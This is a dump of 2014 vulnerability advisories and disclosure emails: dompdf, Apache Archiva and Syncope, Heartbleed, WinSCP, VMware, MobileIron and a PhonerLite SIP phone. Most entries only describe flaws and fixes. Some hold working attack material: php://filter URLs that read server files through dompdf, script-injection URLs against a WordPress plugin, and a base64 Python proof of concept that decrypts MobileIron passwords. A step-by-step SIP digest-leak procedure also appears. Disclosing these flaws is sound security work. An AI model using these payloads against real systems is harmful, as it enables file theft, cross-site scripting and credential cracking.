DOMPDF_ENABLE_PHP to be enabled (which is disabled by default).
Using PHP protocol and wrappers it is possible to bypass the dompdf's
""chroot"" protection (DOMPDF_CHROOT) which prevents dompdf from accessing
system files or other files on the webserver. Please note that the flag
DOMPDF_ENABLE_REMOTE needs to be enabled.
Command line interface:
php dompdf.php
php://filter/read=convert.base64-encode/resource=<PATH_TO_THE_FILE>
Web interface:
http://example/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=<PATH_TO_THE_FILE>
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-2383/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information."
6971,[SECURITY] CVE-2013-2251: Apache Archiva Remote Command Execution,,CVE-2013-2251,"CVE-2013-2251: Apache Archiva Remote Command Execution
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
- Archiva 1.3 to Continuum 1.3.6
- The unsupported versions Archiva 1.2 to 1.2.2 are also affected.
Description:
Apache Archiva is affected by a vulnerability in the version of the Struts library being used, which allows a malicious user to run code on the server remotely. More details about the vulnerability can be found at http://struts.apache.org/2.3.x/docs/s2-016.html.
Mitigation:
All users are recommended to upgrade to Archiva 2.0.1 or Archiva 1.3.8, which are not affected by this issue.
Archiva 2.0.0 and later is not affected by this issue.
References:
http://archiva.apache.org/security.html"
6972,[SECURITY] CVE-2013-2187: Apache Archiva Cross-Site Scripting vulnerability,,CVE-2013-2187,"CVE-2013-2187: Apache Archiva Cross-Site Scripting vulnerability
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
- Archiva 1.3 to Continuum 1.3.6
- The unsupported versions Archiva 1.2 to 1.2.2 are also affected.
Description:
A request that included a specially crafted request parameter could be used to inject arbitrary HTML or Javascript into the Archiva home page.
Mitigation:
All users are recommended to upgrade to Archiva 2.0.1 or Archiva 1.3.8, which are not affected by this issue.
Archiva 2.0.0 and later is not affected by this issue.
References:
http://archiva.apache.org/security.html"
6992,CVE-2014-2597 - Denial of Service in PCNetSoftware RAC Server,,CVE-2014-2597,"Vulnerability title: Denial of Service in PCNetSoftware RAC Server
CVE: CVE-2014-2597
Vendor: PCNetSoftware
Product: RAC Server
Affected version: 4.0.4, 4.0.5
Fixed version: N/A
Reported by: Kyriakos Economou
Details:
Latest and possibly earlier versions of RAC Server software are
vulnerable to local DoS attacks that can cause either to disable the
keyboard input or to kill the system through a BSoD, by sending specific
IOCTL codes to RACDriver.sys kernel mode driver. The attacker can choose
between the two.
The BSoD is triggered because the size of the input buffer received by
the driver is not correctly validated against the size of a static
buffer, inside the driver module itself, from where the driver transfers
some data to the allocated buffer.
The vulnerable function assumes that the size of the input buffer will
always be less or equal to the static one.
This leads to memory access violation inside the kernel address space
when the input buffer is too big, because the vulnerable function will
attempt to read outside the module itself.
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-2597/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information."
7000,CVE-2014-2735 - WinSCP: missing X.509 validation,,CVE-2014-2735,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2014-003
Product: WinSCP
Affected Version(s): 5.5.2.4130
Tested Version(s): 5.5.2.4130 (Windows 7 32 bit and Windows 8.1 64 bit)
Vulnerability Type: Missing X.509 validation
Risk Level: Medium
Solution Status: Fixed
Vendor Notification: 2014-04-07
Solution Date: 2014-04-09
Public Disclosure: 2014-04-16
CVE Reference: CVE-2014-2735
Author of Advisory: Micha Borrmann (SySS GmbH)
-
--------------------------------------------------------------------------------
Overview: WinSCP is not checking the ""Common Name"" of a X.509
certificate, when FTP with TLS is used.
-
--------------------------------------------------------------------------------
Vulnerability Details:
A user can not recognize an easy to perform man-in-the-middle attack,
because the client does not validate the ""Common Name"" of the servers
X.509 certificate. In networking environment that is not trustworthy,
like a wifi network, using FTP AUTH TLS with WinSCP the servers identity
can not be trusted.
-
--------------------------------------------------------------------------------
Solution: Upgrade to WinSCP 5.5.3
-
--------------------------------------------------------------------------------
Disclosure Timeline:
April 07, 2014 - Vulnerability discovered
April 07, 2014 - Vulnerability reported to vendor
April 09, 2014 - Bug was confirmed and fixed by the vendor [1]
April 10, 2014 - Bug fix could be confirmed with WinSCP 5.5.3 (Build 4193)
April 14, 2014 - WinSCP 5.5.3 (Build 4214) was released [2]
-
--------------------------------------------------------------------------------
References:
[1] http://winscp.net/tracker/show_bug.cgi?id=1152
[2] http://winscp.net/eng/download.php
-
--------------------------------------------------------------------------------
Credits:
Security vulnerability found by Micha Borrmann of the SySS GmbH.
E-Mail: micha.borrmann (at) syss.de
Public Key:
https://www.syss.de/fileadmin/dokumente/Materialien/PGPKeys/Micha_Borrmann.asc
Key fingerprint = 6897 7B33 B359 B8BA 0884 969F FC67 EBA9 1B51 128A
-
--------------------------------------------------------------------------------
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS web
site.
-
--------------------------------------------------------------------------------
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIcBAEBCgAGBQJTTireAAoJEPxn66kbURKKXe0QAIVS4dK27VeNSE68I2BmgVjR
BZkHe7S1X1uec9o7CyT0LUGV+7F/esfDmbfn3vXm/WV6qbUhMLPSIrEKr4HF3bXf
s4b/r117Wy9kj02CtLTAw82egLWYakNPq168v0+zi0tTYY1xqgErPVlid8zPmR9n
aNDQ4MH1HX3PSyXb3q4fkZGUhKgZuCxjwDE1jCm1TroUVy3+NhaE7kZKls6DV8UM
KgbMkee0lyGRWKzGG/+by7qdqT9iHK1tBcI18XEQxlHQjRFG/SDyL1eCyg+VORB6
8fVgh8bN1UyIEouZBnrqx6hhNQua7iMmeV5aTEMstMgbw3XvEMmEuAN2ZJOeod2U
zZ/+huTLULAqfgefwOOVJBw04hbTyfWDhdvFwpVsoEvt6MMtB+hJuA6GXUjGMZ6W
TIYiLKDSMOhFVn/zpPySgGLlu6VOyU5D5RWsZXacHJBeMb8nFl6vi5QECjI2pN+s
rFGgjMKemz7CEQk4BM2giQD3O7cq68iTwCVcys9EbMllXpY1P+haZGdhnSY4ZoJt
s5xWrgkT4YIaMeJPMUV0O9yuSyJYVSCwZYgA/CNv8e40ddkXwymLv07Qvkx59upw
Z6WW/+TVPB+wcO1gq+P+sDqXMbkMMF+DjSrvHpuS/gNd5masoJhJRNEnCvpJCDtY
Eopi3SjkNeyBsm1wRii2
=se8l
-----END PGP SIGNATURE-----"
7005,[SECURITY] CVE-2014-0111 Apache Syncope,,CVE-2014-0111,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2014-0111: Remote code execution by an authenticated administrator
Severity: Important
Vendor:
The Apache Software Foundation
Versions Affected:
Syncope 1.0.0 to 1.0.8
Syncope 1.1.0 to 1.1.6
Description:
In the various places in which Apache Commons JEXL expressions are allowed (derived schema definition, user / role templates, account links of resource mappings) a malicious administrator can inject Java code that can be executed remotely by the JEE container running the Apache Syncope core.
Credit:
This issue was discovered by Grï¿½gory Draperi.
References:
http://syncope.apache.org/security.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.14 (GNU/Linux)
Comment: Using GnuPG with Thunderbird - http://www.enigmail.net/
iQEcBAEBAgAGBQJTTOJyAAoJEGtDE+0nPfKHxWcIAI9POTzr4bIF7fXO25uXgfny
BO8SR0fmGScdmeohf8nQZbUNgKA1F7YRe5vC9r8nKFSpdDJrMnPSTOwMYrgdOxHt
Rl/SpEab4b8NX0FO1a6TObDbXBDj+Q+4cNUXOOc0jC7lU67n1SorfGaMbjLfcZ0w
2xnZsbAQ0P0bmIJ2mR+LuXLsEA3kwvClF9fUTEDlJ4Rm/yT16UGvD5+vEJdMQzen
JhBdT8VeX4wvtYr9+WmmWqeWgvSmezE07s5Pu36qXkxAEFGzdQBtJ/XJbpbgM7Sa
7MoZQHQqJ5VwUVGMseqcxhAjD065uHP41HpAeF4TFQvp4jg8/FiybFdXqiJ+smI=
=4XQi
-----END PGP SIGNATURE-----"
7006,"RUCKUS ADVISORY ID 041414: OpenSSL 1.0.1 library's ""Heart bleed"" vulnerability - CVE-2014-0160",,CVE-2014-0160,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
RUCKUS ADVISORY ID 041414
Customer release date: April 14, 2014
Public release date: April 14, 2014
TITLE
OpenSSL 1.0.1 library's ""Heart bleed"" vulnerability - CVE-2014-0160
SUMMARY
OpenSSL library is used in Ruckus products to implement various
security related features. A vulnerability has been discovered in
OpenSSL library which may allow an unauthenticated, remote attacker to
retrieve memory in chunks of 64 kilobytes from a connected client or
server. An exploit could disclose portions of memory containing
sensitive security material such as passwords and private keys.
AFFECTED SOFTWARE VERSIONS AND DEVICES
Device Affected software
- --------------------- ------------------
Smart Cell Gateway 1.1.x
SmartCell Access Points NOT AFFECTED
ZoneDirector Controllers NOT AFFECTED
ZoneFlex Access Points NOT AFFECTED
Any products or services not mentioned in the table above are not affected
DETAILS
A vulnerability has been discovered in the popular OpenSSL
cryptographic software library. This weakness exists in OpenSSL's
implementation of the TLS/DTLS (transport layer security protocols)
heartbeat extension (RFC6520). This vulnerability is due to a missing
bounds check in implementation of the handling of the heartbeat
extension. When exploited, this issue may lead to leak of memory
contents from the server to the client and from the client to the
server. These memory contents could contain sensitive security
material such as passwords and private keys.
IMPACT
Ruckus devices incorporate OpenSSL library to implement various
security related features. Below is list of the affected components:
- - Administrative HTTPS Interface (Port 8443)
CVSS v2 Base Score:5.0 (MEDIUM) (AV:N/AC:L/Au:N/C:P/I:N/A:N)
WORKAROUNDS
Ruckus recommends that all customers apply the appropriate patch(es)
as soon as practical. However, in the event that a patch cannot
immediately be applied, the following suggestions might help reduce
the risk:
- Do not expose administrative interfaces of Ruckus devices to
untrusted networks such as the Internet.
- Use a firewall to limit traffic to/from Ruckus device's
administrative interface to trusted hosts.
SOLUTION
Ruckus recommends that all customers apply the appropriate patch(es)
as soon as practical.
The following software builds have the fix (any later builds will also
have the fix):
Branch Software Build
- ------- ------------------
1.1.x 1.1.2.0.142
DISCOVERY
This vulnerability was disclosed online on various sources :
- - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
- - https://www.openssl.org/news/secadv_20140407.txt
- - http://heartbleed.com/
OBTAINING FIXED FIRMWARE
Ruckus customers can contact Ruckus support to obtain the fixed firmware
Ruckus Support contact list is at:
https://support.ruckuswireless.com/contact-us
PUBLIC ANNOUNCEMENTS
This security advisory will be made available for public consumption
on April 14, 2014 at the following source
Ruckus Website
http://www.ruckuswireless.com/security
SecurityFocus Bugtraq
http://www.securityfocus.com/archive/1
Future updates of this advisory, if any, will be placed on Ruckus's
website, but may or may not be actively announced on mailing lists.
REVISION HISTORY
Revision 1.0 / 14th April 2014 / Initial release
RUCKUS WIRELESS SECURITY PROCEDURES
Complete information on reporting security vulnerabilities in Ruckus
Wireless
products, obtaining assistance with security incidents is available at
http://www.ruckuswireless.com/security
For reporting new security issues, email can be sent to
security(at)ruckuswireless.com
For sensitive information we encourage the use of PGP encryption. Our
public keys can be
found at http://www.ruckuswireless.com/security
STATUS OF THIS NOTICE: Final
Although Ruckus cannot guarantee the accuracy of all statements
in this advisory, all of the facts have been checked to the best of our
ability. Ruckus does not anticipate issuing updated versions of
this advisory unless there is some material change in the facts. Should
there be a significant change in the facts, Ruckus may update this
advisory.
(c) Copyright 2014 by Ruckus Wireless
This advisory may be redistributed freely after the public release
date given at
the top of the text, provided that redistributed copies are complete and
unmodified, including all date and version information.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG/MacGPG2 v2.0.18 (Darwin)
Comment: GPGTools - http://gpgtools.org
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
iQEcBAEBAgAGBQJTTBeuAAoJEFH6g5RLqzh1fRsIAJ9MtudIbdzR7mm/hP0i7boN
MqlHAnFWai1c99UX048I9PSwWzWuEj4/1E4jy4vQqxLG8gO0YbAQiGq4DDGErCU0
AywV+p3Xlcn0SXp0vse/qnhOT0jVOOKXPZSokmoptQXbd28ZOYtGfMJozTvPh2vf
AvGq2B5kciGVhvBc9hdHGhSla/xUr/puIOBKFtNfMuxPujJ62t8g07w2HCB51PL/
5E5MrP4540n3ONZ9+w5h/AeVfvVXsFv25VuElckq6Anzm+iqNRjcWHdync14UqPx
2kXr1E72zRYbY/Z7+QkQuL1REkka+RtGcwbo05u+aEUnPx3E9wvdCHjf6XhxcbI=
=sbsc
-----END PGP SIGNATURE-----"
7010,CVE-2013-6216 - SetUID/SetGID Programs Allow Privilege Escalation Via Insecure RPATH in multiple HP products on Linux,,CVE-2013-6216,"Vulnerability title: SetUID/SetGID Programs Allow Privilege Escalation
Via Insecure RPATH in HP Array Configuration Utility, HP Array
Diagnostics Utility, HP ProLiant Array Diagnostics and SmartSSD Wear
Gauge Utility Running on Linux
CVE: CVE-2013-6216
Vendor: HP
Product: HP Array Configuration Utility, HP Array Diagnostics Utility,
HP ProLiant Array Diagnostics and SmartSSD Wear Gauge Utility Running on
Linux
Affected version: 9.40
Fixed version: N/A
Reported by: Tim Brown
Details:
It has been identified that binaries that are executed with elevated
privileges (SetGID and SetUID programs) have been compiled in manner
that means they searched for libraries in insecure locations.
An attacker could place a malicious library in one of the affected
directories, which would then be loaded when the affected program is
run, leading to privilege escalation in instances where the program runs
with privileges that the attacker does not have.
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2013-6216/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information."
7024,CVE-2014-2384 - Invalid Pointer Dereference in VMware Workstation and Player,,CVE-2014-2384,"Vulnerability title: Invalid Pointer Dereference in VMware Workstation
and Player
CVE: CVE-2014-2384
Vendor: VMware
Product: Workstation, Player
Affected version: VMware WorkStation v10.0.1 build-1379776 and VMware
Player v6.0.1 build-1379776
Fixed version: N/A
Reported by: Kyriakos Economou
Details:
The vmx86.sys (32 & 64-bit) kernel mode driver shared by various VMware
Windows products such as VMware Workstation and VMWare Player, allows a
local attacker to kill the host system through a Blue Screen of Death by
sending a specific IOCTL code with a 3 bytes, or larger, input buffer.
The Blue Screen is triggered because the vulnerable function doesnï¿½t
check if a pointer to a memory page is valid or not, thus causing a
memory access violation by trying to read from an unallocated memory page.
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-2384/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information."
7045,CVE-2014-0160 mitigation using iptables,,CVE-2014-0160,"Following up on the CVE-2014-0160 vulnerability, heartbleed. We've
created some iptables rules to block all heartbeat queries using the
very powerful u32 module.
The rules allow you to mitigate systems that can't yet be patched by
blocking ALL the heartbeat handshakes. We also like the capability to
log external scanners :)
The rules have been specifically created for HTTPS traffic and may be
adapted for other protocols; SMTPS/IMAPS/...
# Log rules
iptables -t filter -A INPUT -p tcp --dport 443 -m u32 --u32
""52=0x18030000:0x1803FFFF"" -j LOG --log-prefix ""BLOCKED: HEARTBEAT""
# Block rules
iptables -t filter -A INPUT -p tcp --dport 443 -m u32 --u32
""52=0x18030000:0x1803FFFF"" -j DROP
# Wireshark rules
$ tshark -i interface port 443 -R 'frame[68:1] == 18'
$ tshark -i interface port 443 -R 'ssl.record.content_type == 24'
We believe that this should only be used as a temporary fix to decrease
the exposure window. The log rule should allow you to test the firewall
rules before being used in production. It goes without saying that if
you have any suggested improvements to these rules we would be grateful
if you could share them with the security community.
Clearly, use of these rules is at your own risk ;)
ECSC SOC Team Researchers:
Adam Shore
Alex Innes
Fabien Bourdaire
--
ECSC Ltd - http://www.ecsc.co.uk"
7051,Re: CVE-2014-2297(WordPress-videowhisper-live-streaming-integration 4.29.6-Xss),,CVE-2014-2297,"Thank you for reporting this plugin. We're looking into it right now.
If you wish to help us speed up the process, please remember to include a clear and concise description of the issue. In the case of any security exploits, it greatly helps if you can provide us with how you verified this is an exploit (links to the plugin listing on sites like Secuina are perfect).
If you provided a link to your report, DO NOT delete it! We have passed it on directly to the developers of the plugin.
Please note: You may not receive further communication from us on this matter, simply due to the volume of emails we get a day. We do greatly appreciate the report.
> Hi All,
>
> CVE-2014-2297(WordPress-videowhisper-live-streaming-integration
> 4.29.6-Xss), as follows:
>
>
>
> [»] Language: [php ]
>
>
>
> [»] Version: [ version4.29.6 ] 
> [»] Team:
> Vty###########################################################################
>
>
>
> ===[ Exploit ]==
>
>
>
> [»] Exploit-1：videowhisper-live-streaming-integration/ls/htmlchat.php File
> before using the variable n is not initialized, resulting in cross-site
> scripting vulnerabilities, the specific code in line 34 of the
> file（Code:<title><?=$n?> Text Chat</title>）:
> http://localhost//wp/wp-content/plugins/videowhisper-live-streaming-integration/ls/htmlchat.php?n=</title><script>alert(1)</script>
> [»] Exploit-2：videowhisper-live-streaming-integration/ls/index.php Bgcolor
> file using variables not previously initialized, resulting in cross-site
> scripting vulnerabilities, the specific code in the sixth line of the
> file（Code：<body bgcolor=""<?=$bgcolor?>"">）:
> http://localhost//wp/wp-content/plugins/videowhisper-live-streaming-integration/ls/index.php?bgcolor=""><script>alert(1)</script>//
--
Ipstenu (Mika Epstein)"
7075,[MATTA-2013-004] CVE-2014-1409; MobileIron authentication bypass vulnerability,,CVE-2014-1409,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
Matta Consulting - Matta Advisory
https://www.trustmatta.com
MobileIron Multiple Products
Authentication Bypass Vulnerability
Advisory ID: MATTA-2013-004
CVE reference: CVE-2014-1409, CVE-2013-7286
Affected platforms: VSP and Sentry
Version: VSP < 5.9.1 and Sentry < 5.0
Date: 2013-December-19
Security risk: Critical
Researcher: Nico Leidecker
Vendor Status: Patch released
Vulnerability Disclosure Policy:
https://www.trustmatta.com/advisories/matta-disclosure-policy-01.txt
Permanent URL:
https://www.trustmatta.com/advisories/MATTA-2013-004.txt
=====================================================================
Description:
During an external penetration test exercise for one of our clients,
an authentication bypass vulnerability was found in the
administrative interface of a MobileIron deployment. This ultimately
allowed us to, gain access to our client's internal network.
The 'j_username' parameter of the script at
https://<target>/mics/j_spring_security_check is vulnerable to blind
XPath Injection, allowing an unauthenticated attacker to retrieve the
underlying XML document.
This XML document is an excerpt of the configuration file of the
device. It contains obfuscated passwords and, depending on
configuration, might contain domain credentials and allow the
attacker to reposition both internally and on any of the attached
devices.
This vulnerability has been assigned CVE-2014-1409.
The password obfuscation algorithm is known and has already been
documented [1]... AES-ECB-PKCS1.5 with a known, shared key. While we
won't release a full-featured exploit for the vulnerability, we will
release a PoC to confirm whether the hashes are indeed vulnerable.
The vendor has confirmed that a stronger encryption method is used
since release 5.7.
This vulnerability has been assigned CVE-2013-7286.
[1]
https://www.hackinparis.com/sites/hackinparis.com/files/MDM-HIP_2013.pdf
NB: A second insecure encryption scheme is described in [1], MITRE has
assigned CVE-2013-7287 to that separate vulnerability.
=====================================================================
Base64 encoded script to confirm whether the hash provided is
vulnerable to CVE-2013-7286:
IyEvdXNyL2Jpbi9lbnYgcHl0aG9uCiMKIyAgTW9iaWxlSXJvbiB1c2VzIEFFUy1FQ0ItUEtDUzEu
NSAod2l0aCBhIGtub3duIGtleSkKIyB0byBzdG9yZSBjcmVkZW50aWFscy4uLiBXaGF0IGEgYnJp
bGxpYW50IGlkZWEhCiMKIyBUaGlzIHNjcmlwdCBpcyBhYm91dCBjaGVja2luZyB3aGV0aGVyIHRo
ZSBwcm92aWRlZAojIGhhc2ggaXMgdnVsbmVyYWJsZSB0byBDVkUtMjAxMy03Mjg2IG9yIG5vdC4K
IwojIE5leHRHZW4kIH4gMjAxMwoKaW1wb3J0IHN5cwppbXBvcnQgYmluYXNjaWkKaW1wb3J0IGhh
c2hsaWIKaW1wb3J0IHN0cmluZwpmcm9tIENyeXB0by5DaXBoZXIgaW1wb3J0IEFFUwoKaWYgbGVu
KHN5cy5hcmd2KTwyOiAgICAKIHN5cy5leGl0KCdVc2FnZTogLi9DVkUtMjAxMy03Mjg2LnB5IDxi
YXNlNjRlbmNvZGVkIGJsb2I
+JykKCkJTID0gOAp1bnBhZCA9IGxhbWJkYSBzIDogc1swOi1vcmQo
c1stMV0pXQoKaWYgX19uYW1lX189PSAiX19tYWluX18iOgogICAgIyBHZW5lcmF0ZSB0aGUgbWFz
dGVyIGtleS4uLgogICAgIyBZZXMuIEl0J3Mgbm90IGEgdHlwbyEKICAgIHBocmFzZSA9ICdIYWt1
bmEgbWF0YXRhIHdoYXQgYSB3b2RlcmZ1bCBwaHJhc2UnCiAgICBtID0gaGFzaGxpYi5zaGExKCkK
ICAgIG0udXBkYXRlKHBocmFzZSkKIyBXZSBvbmx5IHdhbnQgdGhlIDE2IGZpcnN0IGJ5dGVzICgx
MjhiaXQga2V5LCAxNjBiaXQgaGFzaCBmdW5jdGlvbikKICAgIGtleSA9IG0uZGlnZXN0KClbOjE2
XQogICAgY2lwaGVydGV4dCA9IGJpbmFzY2lpLmEyYl9iYXNlNjQoc3lzLmFyZ3ZbMV0pCiAgICBj
aXBoZXIgPSBBRVMubmV3KGtleSwgQUVTLk1PREVfRUNCKSAKICAgIHBsYWludGV4dCA9IHVucGFk
KGNpcGhlci5kZWNyeXB0KGNpcGhlcnRleHQpKQogICAgdnVsbmVyYWJsZSA9IGxlbihwbGFpbnRl
eHQpID4gMCBhbmQgYWxsKGMgaW4gc3RyaW5nLnByaW50YWJsZSBmb3IgYyBpbiBwbGFpbnRleHQp
CiAgICBwcmludCAnJXNWVUxORVJBQkxFIFRPIENWRS0yMDEzLTcyODYnICUgKCcnIGlmIHZ1bG5l
cmFibGUgZWxzZSAnTk9UICcpCg==
=====================================================================
Impact
Successful exploitation allows an unauthenticated attacker to take
over the device and potentially any device attached to it as well
as the Active Directory Domain it might be linked to.
=====================================================================
Versions affected:
- - Sentry Standalone < 5
- - VSP < 5.9.1
=====================================================================
Workaround:
Restrict access to the MICS service (administrative interface) to
specific hosts:
MICS Portal -> Security -> Portal ACLs -> System Manager Portal ACL
=====================================================================
Credits
This vulnerability was discovered by Nico Leidecker from Matta
Consulting.
=====================================================================
History
19-12-13 initial discovery
30-12-13 client has mitigated the vulnerability
30-12-13 initial attempt to contact the vendor
30-12-13 reply from the vendor
31-12-13 a draft of this advisory is sent to the vendor
03-01-14 vendor can't reproduce / ask for more details
03-01-14 more details are sent
07-01-14 vendor recognize that there is a bug but dissmisses it as a
security vulnerability
07-01-14 more details are sent
14-01-14 a week lapsed, no reply... we chase it up
14-01-14 vendor reply: they're working on a response
15-01-14 vendor respond: reclassify the bug as a security issue,
indicate that they indend on fixing the bug in the Q1 release,
provide a workaround and ask for us to hold on releasing the
advisory until the release is published
15-01-14 we agree to a deadline extension, send the CVEs MITRE has
assigned
...
19-02-14 vendor release 5.9.1 (but doesn't let us know)
...
31-03-14 vendor indicate that the release of VSP 6 is delayed but
the bugs have been fixed in 5.9.1
02-04-14 release of this advisory
=====================================================================
About Matta
Matta is a privately held company with Headquarters in London, and a
European office in Amsterdam. Established in 2001, Matta operates
in Europe, Asia, the Middle East and North America using a respected
team of senior consultants. Matta is an accredited provider of
Tiger Scheme training and conducts regular research.
https://www.trustmatta.com
https://www.trustmatta.com/training.html
https://www.trustmatta.com/network-penetration-testing.html
https://www.trustmatta.com/vulnerability-assessment.html
=====================================================================
Disclaimer and Copyright
Copyright (c) 2014 Matta Consulting Limited. All rights reserved.
This advisory may be distributed as long as its distribution is
free-of-charge and proper credit is given.
The information provided in this advisory is provided ""as is"" without
warranty of any kind. Matta Consulting disclaims all warranties,
either express or implied, including the warranties of
merchantability and fitness for a particular purpose. In no event
shall Matta Consulting or its suppliers be liable for any damages
whatsoever including direct, indirect, incidental, consequential,
loss of business profits or special damages, even if Matta
Consulting or its suppliers have been advised of the possibility
of such damages.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1
iQEcBAEBCAAGBQJTO/cTAAoJELJDQjn66kB28ysIAILzCnK9mifpyjswSKOJPzUi
EgcexJdVIjWZf32gLi202YCHJkiIXNGfG390HrWMQZZWU2l+lEb4cMb4NH8xsjzg
06GbBnrRzBcE35dhO3C0aHuPFh7MRQzbRM4mVyPg1ViUlM7Lb9kQBoD6xdS4gZ09
SaNAdm44WrvGiFAO8yuT56cjHZ1ZYfr+iHQjxY7UIrvmzKKSvMnvv13Fy2CIrRPe
zk7QLfyxszbR/eo+HOroNhHAPnfl8Mu0Y/1ihFTJF96irCPuejR7v9WzqlJxRfZB
ZQJCKnz1c9cCDPxNY9GliBKT0FlkLX+IOVP/TF40jT7Zk6f+cWgOXcghlgnyunA=
=XxBr
-----END PGP SIGNATURE-----"
7088,PhonerLite 2.14 SIP Soft Phone - SIP Digest Leak Information Disclosure (CVE-2014-2560),,CVE-2014-2560,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
I. Advisory Summary
Title: SIP Digest Leak Information Disclosure in PhonerLite 2.14 SIP Soft
Phone
Date Published: March 30, 2014
Vendors contacted: Heiko Sommerfeldt, PhonerLite author
Discovered by: Jason Ostrom
Severity: Medium
II. Vulnerability Scoring Metrics
CVE Reference: CVE-2014-2560
CVSS v2 Base Score: 4.3
CVSS v2 Vector: (AV:N/AC:M/Au:N/C:P/I:N/A:N)
Component(s): PhonerLite SIP Soft Phone
Class: Information Disclosure
III. Introduction
PhonerLite [1] is a freeware SIP soft phone client running on the Windows
platform and supporting common VoIP features as well as security
functionality such as SIP TLS, SRTP, and ZRTP.
[1] http://www.phonerlite.de
IV. Vulnerability Description
PhonerLite SIP soft phone version 2.14 is vulnerable to revealing SIP MD5
digest authenticated user credential hash via spoofed SIP INVITE message
sent by a malicious 3rd party. After responding back to an authentication
challenge to the BYE message, PhonerLite leaks the hashed MD5 digest
credentials. After the 3rd party receives the dumped MD5 hash, they can use
this information to mount an offline wordlist attack. This SIP protocol
implementation issue vulnerability was initially discovered by Sandro Gauci
of Enable Security [2], with vendor soft phones and handsets showing
differential success in mitigating this flaw. CVE-IDs have been reserved
for two previous SIP soft phone implementations [3, 4] that were tested as
vulnerable.
[2] https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf
[3] CVE-ID for Gizmo5 soft phone: CVE-2009-5139
[4] CVE-ID for Linksys SPA2102 adapter: CVE-2009-5140
V. Technical Description / Proof of Concept Code
The following steps can be carried out in duplicating this vulnerability.
Step 1:
Use SIPp protocol tester to craft a SIP INVITE message using TCP transport
and forward the SIP message towards the IP address of the Windows PhonerLite
soft phone, listening on TCP port 5060
Step 2:
PhonerLite user answers call
Step 3:
PhonerLite user hangs up call, since there is no one talking (it is like
dead air)
Step 4:
Attacker receives BYE message from PhonerLite. Immediately after receiving
BYE, attacker sends a 401 challenge SIP message
Step 5:
PhonerLite responds with a second BYE message, containing SIP Authorization
header (which contains MD5 hash / response)
Step 6:
Attacker mounts an offline wordlist attack against the dumped MD5 hash using
sipdump/sipcrack
Additional Notes:
* The vulnerability verification was tested as a malicious 3rd party using
Kali Linux [5] distribution, with all tools included in distro.
* The attacker does not need to know the correct username of PhonerLite
registered SIP user. The attacker only needs to find the IP address of a
PhonerLite endpoint listening on TCP port 5060.
* The attacker does not need to know the digest realm field. A null realm
string of ""NULL"" or ""null"" will be sufficient in exploiting the flaw.
* Verified that PhonerLite is not vulnerable to this security flaw when
attacker uses UDP transport instead of TCP
[5] http://kali.org
VIII. Vendor Information, Solutions, and Workarounds
This issue is fixed in PhonerLite version 2.15
Resolution is the following, as specified by the author: A SIP UAC (User
Agent Client) should not send a 401 or 407. In other words, only a UAS
(User Agent Server) should send a 401 or 407 challenge. Therefore, a
401/407 will be dropped by the UAS (PhonerLite) if sent by a malicious 3rd
party UAC.
IX. Credits
This vulnerability has been discovered by:
Jason Ostrom of Stora
XX. Vulnerability History
Sun, 2/16/14: Vulnerability discovered
Wed, 3/12/14: Sent vulnerability disclosure to Heiko Sommerfeldt, info at
phoner.de
Thu, 3/13/14: Notified by author that Beta version has been uploaded, which
